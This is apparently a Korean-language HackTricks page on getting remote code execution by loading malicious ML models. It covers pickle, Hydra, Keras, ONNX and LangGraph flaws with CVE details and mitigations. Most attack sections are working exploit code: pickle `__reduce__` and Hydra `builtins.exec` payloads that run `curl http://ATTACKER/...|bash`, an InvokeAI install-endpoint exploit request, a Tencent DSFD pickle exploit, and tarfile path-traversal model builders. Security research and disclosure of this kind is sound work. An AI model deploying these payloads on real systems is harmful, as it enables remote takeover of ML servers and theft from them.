# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

Machine Learning 모델은 일반적으로 ONNX, TensorFlow, PyTorch 등 여러 형식으로 공유됩니다. 이러한 모델은 개발자 머신이나 production 시스템에 로드되어 사용됩니다. 일반적으로 모델에는 malicious code가 포함되어서는 안 되지만, 모델이 의도된 기능으로 시스템에서 arbitrary code를 실행하는 데 사용되거나 모델 loading library의 vulnerability로 인해 arbitrary code execution이 발생할 수 있는 경우가 있습니다.

다음 표에는 이 category에 해당하는 대표적인 vulnerabilities가 정리되어 있습니다:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | 모델 checkpoint의 malicious pickle이 code execution으로 이어짐 (`weights_only` safeguard 우회)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download로 code execution 발생; management API에서 Java deserialization RCE 발생                                        | |
| **NVIDIA Merlin Transformers4Rec** | `torch.load`를 통한 Unsafe checkpoint deserialization **(CVE-2025-23298)**                                           | 신뢰할 수 없는 checkpoint가 `load_model_trainer_states_from_checkpoint` 중 pickle reducer를 trigger하여 ML worker에서 code execution 발생            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + unsafe MessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | User-controlled `filter` key가 SQL/JSON-path syntax를 inject하고, `UNION SELECT`가 fake checkpoint row를 생성한 뒤, `msgpack` deserialization이 attacker가 선택한 Python code를 import하고 호출 | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | YAML에서 모델을 로드하면 `yaml.unsafe_load`가 사용되어 code exec 발생 <br> **Lambda** layer로 모델을 로드하면 arbitrary Python code 실행          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Crafted `.tflite` 모델이 integer overflow를 trigger하여 heap corruption 발생 → potential RCE                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | `joblib.load`를 통해 모델을 로드하면 attacker의 `__reduce__` payload가 포함된 pickle이 실행                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` 기본 설정이 pickled object arrays를 허용하여 malicious `.npy/.npz`가 code exec를 trigger                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX 모델의 external-weights path가 directory 밖으로 벗어날 수 있음 (arbitrary files read) <br> Malicious ONNX model tar가 arbitrary files를 overwrite할 수 있음 (RCE로 이어짐) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Custom operator가 포함된 모델은 attacker의 native code loading을 요구함; 복잡한 model graph가 logic을 악용하여 의도하지 않은 computation을 실행   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | `--model-control`이 활성화된 상태에서 model-load API를 사용하면 relative path traversal을 통해 files를 write할 수 있음 (예: RCE를 위한 `.bashrc` overwrite)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Malformed GGUF model file이 parser에서 heap buffer overflows를 발생시켜 victim system에서 arbitrary code execution 가능                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Lambda layer가 포함된 malicious HDF5 (`.h5`) 모델의 code가 load 시 여전히 실행됨 (Keras safe_mode는 old format을 보호하지 않음 – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | 많은 ML tools (예: pickle 기반 model formats, Python `pickle.load`)은 mitigation이 적용되지 않는 한 model files에 포함된 arbitrary code를 실행함 | |
| **NeMo / uni2TS / FlexTok (Hydra)** | 신뢰할 수 없는 metadata가 `hydra.utils.instantiate()`로 전달됨 **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Attacker-controlled model metadata/config가 `_target_`을 arbitrary callable (예: `builtins.exec`)로 설정 → “safe” formats (`.safetensors`, `.nemo`, repo `config.json`)에서도 load 중 실행됨 | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

또한 [PyTorch](https://github.com/pytorch/pytorch/security)에서 사용하는 것과 같은 Python pickle 기반 모델 중에는 `weights_only=True`로 로드하지 않을 경우 시스템에서 arbitrary code를 실행하는 데 사용될 수 있는 것들이 있습니다. 따라서 pickle 기반 모델은 위 표에 나열되지 않았더라도 이러한 유형의 attacks에 특히 취약할 수 있습니다.

### Hydra metadata → RCE (works even with safetensors)

`hydra.utils.instantiate()`는 configuration/metadata object에 있는 dotted `_target_`을 import하고 호출합니다. Hugging Face Transformers와 같은 libraries가 **untrusted model metadata**를 `instantiate()`에 전달하면, attacker가 model load 중 즉시 실행되는 callable과 arguments를 제공할 수 있습니다 (pickle 불필요).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Payload example (`.nemo` `model_config.yaml`, repo `config.json`, 또는 `.safetensors` 내부의 `__metadata__`에서 작동):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
핵심 사항:
- NeMo `restore_from/from_pretrained`, uni2TS HuggingFace coders 및 FlexTok loaders에서 model initialization 전에 트리거됩니다.
- Hydra의 string block-list는 대체 import path(예: `enum.bltns.eval`) 또는 application-resolved name(예: `nemo.core.classes.common.os.system` → `posix`)을 통해 우회할 수 있습니다.<sup>[[14]](#references)</sup>
- FlexTok는 또한 `ast.literal_eval`을 사용해 stringified metadata를 파싱하므로 Hydra 호출 전에 DoS(CPU/memory blowup)가 발생할 수 있습니다.

### 🆕  `torch.load`를 통한 InvokeAI RCE (CVE-2024-12029)

`InvokeAI`는 Stable-Diffusion을 위한 인기 있는 open-source web interface입니다. **5.3.1 – 5.4.2** 버전은 사용자가 임의의 URL에서 model을 download하고 load할 수 있게 하는 REST endpoint `/api/v2/models/install`을 노출합니다.<sup>[[1]](#references)</sup>

내부적으로 endpoint는 결국 다음을 호출합니다:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
제공된 파일이 **PyTorch checkpoint (`*.ckpt`)**인 경우, `torch.load`는 **pickle deserialization**을 수행합니다. 콘텐츠가 사용자 제어 URL에서 직접 가져오기 때문에, 공격자는 checkpoint 내부에 사용자 지정 `__reduce__` 메서드를 포함한 악성 객체를 삽입할 수 있습니다. 이 메서드는 **deserialization 중에 실행**되어 InvokeAI 서버에서 **remote code execution (RCE)**으로 이어집니다.

이 취약점에는 **CVE-2024-12029**가 할당되었습니다(CVSS 9.8, EPSS 61.17 %).

#### Exploitation walk-through

1. 악성 checkpoint를 생성합니다:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. 제어하는 HTTP 서버에 `payload.ckpt`를 호스팅합니다(예: `http://ATTACKER/payload.ckpt`).
3. 취약한 endpoint를 트리거합니다(인증 필요 없음):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. InvokeAI가 파일을 다운로드하면 `torch.load()`를 호출하고 → `os.system` gadget이 실행되어 공격자가 InvokeAI 프로세스의 컨텍스트에서 code execution을 획득합니다.

즉시 사용 가능한 exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029`이 전체 흐름을 자동화합니다.<sup>[[3]](#references)</sup>

#### 조건

•  InvokeAI 5.3.1-5.4.2 (scan flag 기본값 **false**)
•  공격자가 `/api/v2/models/install`에 접근 가능
•  프로세스에 shell command 실행 권한이 있음

#### 완화 조치

* **InvokeAI ≥ 5.4.3**으로 업그레이드 – patch가 기본값으로 `scan=True`를 설정하고 deserialization 전에 malware scanning을 수행합니다.<sup>[[2]](#references)</sup>
* Checkpoint를 programmatically 로드할 때 `torch.load(file, weights_only=True)` 또는 새로운 [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper를 사용합니다.
* Model source에 allow-list / signature를 적용하고 service를 least-privilege로 실행합니다.

> ⚠️ **모든** Python pickle 기반 format(많은 `.pt`, `.pkl`, `.ckpt`, `.pth` 파일 포함)은 신뢰할 수 없는 source에서 deserialization하는 경우 본질적으로 안전하지 않다는 점을 기억하세요.

---

이전 InvokeAI 버전을 reverse proxy 뒤에서 계속 실행해야 하는 경우 사용할 수 있는 ad-hoc 완화 조치의 예:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec unsafe `torch.load`를 통한 RCE (CVE-2025-23298)

NVIDIA의 Transformers4Rec (Merlin의 일부)는 사용자가 제공한 경로에서 `torch.load()`를 직접 호출하는 안전하지 않은 checkpoint loader를 노출했습니다. `torch.load`는 Python `pickle`에 의존하므로, 공격자가 제어하는 checkpoint는 역직렬화 중 reducer를 통해 임의의 코드를 실행할 수 있습니다.<sup>[[5]](#references)</sup>

취약한 경로 (수정 전): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

이로 인해 RCE가 발생하는 이유: Python pickle에서는 객체가 callable과 인자를 반환하는 reducer (`__reduce__`/`__setstate__`)를 정의할 수 있습니다. 역직렬화 중에 해당 callable이 실행됩니다. 이러한 객체가 checkpoint에 포함되어 있으면 가중치가 사용되기 전에 실행됩니다.

최소 악성 checkpoint 예시:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
전달 벡터와 blast radius:
- repos, buckets 또는 artifact registries를 통해 공유되는 Trojanized checkpoints/models
- checkpoints를 자동으로 로드하는 자동화된 resume/deploy pipelines
- 실행은 training/inference workers 내부에서 발생하며, 대개 elevated privileges를 사용함 (예: containers 내 root)

수정: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802)은 직접적인 `torch.load()`를 `transformers4rec/utils/serialization.py`에 구현된 restricted allow-listed deserializer로 대체했습니다. 새로운 loader는 types/fields를 검증하고 load 중 arbitrary callables가 호출되는 것을 방지합니다.<sup>[[7]](#references)</sup>

PyTorch checkpoints에 특화된 방어 지침:
- 신뢰할 수 없는 데이터를 unpickle하지 마세요. 가능한 경우 [Safetensors](https://huggingface.co/docs/safetensors/index) 또는 ONNX와 같은 non-executable formats를 우선 사용하세요.
- PyTorch serialization을 사용해야 한다면 `weights_only=True` (최신 PyTorch에서 지원)를 사용하거나 Transformers4Rec patch와 유사한 custom allow-listed unpickler를 사용하세요.<sup>[[4]](#references)</sup>
- model provenance/signatures를 적용하고 deserialization을 sandbox 처리하세요 (seccomp/AppArmor; non-root user; restricted FS 및 network egress 차단).
- checkpoint load 시 ML services에서 예상치 못한 child processes가 생성되는지 모니터링하고, `torch.load()`/`pickle` 사용을 추적하세요.

POC 및 vulnerable/patch references:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Example – malicious PyTorch model 제작

- model 생성:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- 모델 로드:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent의 FaceDetection-DSFD는 사용자 제어 데이터를 역직렬화하는 `resnet` endpoint를 노출합니다. ZDI는 원격 공격자가 피해자에게 악성 page/file을 로드하도록 유도하고, 해당 endpoint로 조작된 serialized blob을 전송하게 한 뒤, `root` 권한으로 역직렬화를 트리거하여 시스템을 완전히 장악할 수 있음을 확인했습니다.

이 exploit flow는 일반적인 pickle abuse와 유사합니다:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
역직렬화 중 접근 가능한 모든 gadget(생성자, `__setstate__`, framework callback 등)은 전송 방식이 HTTP, WebSocket 또는 감시 중인 directory에 저장된 file인지와 관계없이 동일한 방식으로 weaponize할 수 있습니다.



### LangGraph checkpointer SQLi → MessagePack RCE

이 attack chain이 흥미로운 이유는 attacker가 **malicious model file을 upload할 필요가 없기 때문입니다**. 대신 application이 **AI-agent persistence API**(`get_state_history(..., filter=...)`)를 노출하고 있으며, user input이 checkpointer query builder에 도달합니다.

#### 1. Metadata filter의 Structural SQLi

취약한 SQLite pattern은 다음과 같았습니다:
```python
for query_key, query_value in filter.items():
operator, param_value = _where_value(query_value)
predicates.append(
f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
)
```
값은 나중에 바인딩되지만, `query_key`는 **JSON path string**에 연결되므로 dictionary key 내부의 `'`가 `'$.{query_key}'`의 바깥으로 빠져나와 SQL을 주입합니다. 동일한 원칙이 **JSON paths, identifiers, operators, `LIMIT`, TTL fields**에도 적용됩니다. placeholders는 값만 보호하며, 구조적인 query syntax는 보호하지 않습니다.

#### 2. `UNION SELECT` can target downstream sinks, not just data theft

이 query는 `type`과 serialize된 `checkpoint` bytes를 반환하며, 이후 다음과 같이 사용됩니다:
```python
self.serde.loads_typed((type, checkpoint))
```
이는 `WHERE` 절의 SQLi가 **가짜 결과 행**을 주입할 수 있다는 의미입니다:
```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```
나중에 코드가 선택한 열을 파싱하거나, 역직렬화하거나, 기록하거나, 실행한다면 해당 열을 sink에 매핑하세요. 이 경우 가짜 행은 SQLi를 **attacker-controlled deserialization**로 전환합니다.

#### 3. Unsafe MessagePack extension hooks는 code gadgets와 동등함

LangGraph의 `msgpack` 경로는 중첩된 tuple을 unpack하고 다음을 실행하는 custom extension hook을 사용했습니다:
```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```
따라서 `("os", "system", "id > /tmp/pwned")`와 동등한 내용을 인코딩한 MessagePack extension object는 `os`를 import하고, `system`을 resolve한 다음 명령을 실행합니다. AI framework를 검토할 때는 dynamic import, reflection 또는 임의 callable dispatch를 수행하는 **custom MessagePack/JSON/pickle revivers**를 점검해야 합니다.

#### 4. Agent framework를 위한 실용적인 audit 패턴

다음 항목에 도달하는 모든 user-controlled input을 검토하세요.
- state history / memory / replay / checkpoint listing APIs
- SQL 또는 Redis query fragment를 생성하는 structured filter builders
- custom deserializers (`pickle`, `msgpack`, `json` object hooks, YAML constructors)
- persistence layer에서 반환된 rows를 신뢰하는 recovery paths

이 specific chain은 신뢰할 수 없는 users가 `filter`를 제어할 수 있는 **SQLite** 또는 **Redis** checkpointers를 사용하는 self-hosted LangGraph deployments에 영향을 주었습니다. disclosure에서 언급된 patched versions는 `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+`, `langgraph-checkpoint 4.0.1+`입니다.<sup>[[15]](#references)</sup>

## Models to Path Traversal

[**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)에서 설명했듯이, 서로 다른 AI frameworks에서 사용되는 대부분의 model formats는 archives를 기반으로 하며, 일반적으로 `.zip` 형식입니다. 따라서 이러한 formats를 악용해 path traversal attacks를 수행하고, model이 로드되는 시스템에서 임의의 files를 읽을 수 있습니다.<sup>[[16]](#references)</sup>

예를 들어 다음 code를 사용하면 로드될 때 `/tmp` directory에 file을 생성하는 model을 만들 수 있습니다:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
또는 다음 코드를 사용하면 로드될 때 `/tmp` 디렉터리에 symlink를 생성하는 모델을 만들 수 있습니다:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### 심층 분석: Keras .keras 역직렬화 및 gadget hunting

.kera 내부 구조, Lambda-layer RCE, ≤ 3.8에서의 arbitrary import issue, 그리고 수정 후 allowlist 내부의 gadget discovery에 대한 집중 가이드는 다음을 참조하세요:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [OffSec 블로그 – "CVE-2024-12029 – InvokeAI 신뢰할 수 없는 데이터 역직렬화"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – torch.load의 보안 고려 사항](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI 블로그 – CVE-2025-23298 NVIDIA Merlin에서 Remote Code Execution 획득하기](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – 최신 AI/ML 형식 및 라이브러리를 통한 Remote Code Execution](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Hydra instantiate docs](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Hydra block-list commit (RCE 경고)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – SQLi에서 RCE까지: LangGraph의 Checkpointer 악용](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Archive Slip 버그를 고가치 AI/ML Bounty로 전환하기](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
{{#include ../banners/hacktricks-training.md}}
